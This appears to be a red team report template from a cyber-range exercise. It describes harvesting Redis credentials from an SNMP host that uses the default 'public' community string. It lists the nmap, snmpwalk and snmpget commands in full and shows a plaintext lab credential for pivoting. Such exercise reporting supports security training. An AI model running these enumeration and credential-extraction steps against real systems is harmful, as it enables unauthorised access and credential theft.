# Red Team Engagement Report
**Classification:** RESTRICTED — White Team / Exercise Controller Only
**Report ID:** RED-REPORT-IT01-M04
**Version:** 1.0
**Date:** [Date of Exercise]
**Operator:** [Red Team Operator Name / Handle]
**Range:** RNG-IT-01 · Corporate Gateway
**Machine:** M4 — itgw-netmgmt

---

## 1. Engagement Summary

| Field | Detail |
|---|---|
| Target | PUL Network Management Host (snmpd) |
| Target IP | `203.x.x.x` |
| Target Port | `161/UDP` (SNMPv2c) |
| Attack Class | SNMP Default Community String + Credential OID Harvest |
| Objective | Walk MIB tree; extract Redis credential fragments; assemble pivot artifact |
| Outcome | **SUCCESSFUL** — `redis-svc-user:r3d1s-cache@PUL!2024` + host `203.x.x.x:6379` obtained |
| Pivot From | M3 admin panel (SNMP host/port/version disclosed) |
| Time to Compromise | `[HH:MM]` from M3 completion |

---

## 2. Vulnerability Analysis

**Vulnerability 1:** `rocommunity public default` — default community string with universal source access.
**Vulnerability 2:** `extend` directives in snmpd.conf exposing credential fragments as OID string values.
**CVSS v3.1 Base Score:** `7.5 HIGH`

---

## 3. Attack Narrative & Timeline

| Step | Time | Action | Outcome |
|---|---|---|---|
| 1 | T+00:00 | UDP port scan / snmpwalk system OIDs | Community `public` confirmed valid |
| 2 | T+00:03 | Walk extend MIB (.1.3.6.1.4.1.8072.1.3.2) | Credential OIDs discovered |
| 3 | T+00:05 | Extract pul-cred-part1 + pul-cred-part2 | `redis-svc-user:r3d` + `1s-cache@PUL!2024` |
| 4 | T+00:06 | Extract pul-cache-host | `203.x.x.x:6379` |
| 5 | T+00:07 | Assemble credential | `redis-svc-user:r3d1s-cache@PUL!2024` |

---

## 4. Commands Executed

```bash
# Service discovery
nmap -sU -p 161 --script snmp-info 203.x.x.x

# Community string confirmation
snmpwalk -v2c -c public 203.x.x.x .1.3.6.1.2.1.1.1.0

# Full extend MIB walk
snmpwalk -v2c -c public 203.x.x.x .1.3.6.1.4.1.8072.1.3.2.3.1.2

# Private enterprise walk
snmpwalk -v2c -c public 203.x.x.x .1.3.6.1.4.1.99999

# Extract specific OID values
snmpget -v2c -c public 203.x.x.x 'NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."pul-cred-part1"'
snmpget -v2c -c public 203.x.x.x 'NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."pul-cred-part2"'
snmpget -v2c -c public 203.x.x.x 'NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."pul-cache-host"'
```

---

## 5. MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Discovery | Network Service Discovery | T1046 |
| Discovery | Remote System Discovery | T1018 |
| Credential Access | Unsecured Credentials | T1552 |
| Collection | Data from Config Repository | T1602.002 |

---

## 6. Pivot Artifact Obtained

| Artifact | Value |
|---|---|
| Redis Username | `redis-svc-user` |
| Redis Password | `r3d1s-cache@PUL!2024` |
| Redis Host | `203.x.x.x` |
| Redis Port | `6379` |
| Next Target | M5 — itgw-cache |

---

## 7. Evidence

> **[Attach: snmpwalk output — pul-cred-part1, pul-cred-part2, pul-cache-host]**
> **[Attach: Assembled credential string]**

---

**Report Prepared By:** [Red Team Operator]
**White Team Review:** [Exercise Controller]
**Classification:** RESTRICTED
